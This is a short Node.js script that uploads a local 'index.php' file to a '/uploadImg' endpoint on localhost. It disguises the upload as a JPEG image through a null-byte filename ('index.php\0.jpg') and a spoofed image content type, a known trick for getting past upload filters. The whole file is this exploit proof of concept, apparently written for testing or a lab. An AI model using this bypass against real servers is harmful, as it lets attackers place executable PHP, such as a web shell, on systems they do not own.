var http = require('http');
var fs = require('fs');

var boundaryKey = function() {
  return new Buffer(String.prototype.substr.call(Math.random(), 2)).toString('base64');
}();

var file = {
  name: 'index.php',
  fakeName: 'index.php\0.jpg',
  type: 'image/jpeg',
  input: 'file'
};

var options = {
  hostname: 'localhost',
  port: 80,
  path: '/uploadImg',
  method: 'POST',
  headers: {
    'Content-Type': 'multipart/form-data; boundary=' + boundaryKey
  }
};

var req = http.request(options, function(res) {
  console.log('STATUS: ' + res.statusCode);
  console.log('HEADERS: ' + JSON.stringify(res.headers));

  res.setEncoding('utf8');
  res.on('data', function(chunk) {
    console.log('BODY: ' + chunk);
  });
});

req.on('error', function(e) {
  console.log('problem with request: ' + e.message);
});

fs.readFile(file.name, function(err, data) {
  if (err) {
    req.end();
    return console.log(err);
  }

  req.write('--' + boundaryKey + '\r\n');
  req.write('Content-Disposition: form-data; name="' + file.input + '"; filename="' + file.fakeName + '"\r\n');
  req.write('Content-Type: ' + file.type + '\r\n\r\n');
  req.write(data);
  req.end('\r\n--' + boundaryKey + '--\r\n');
});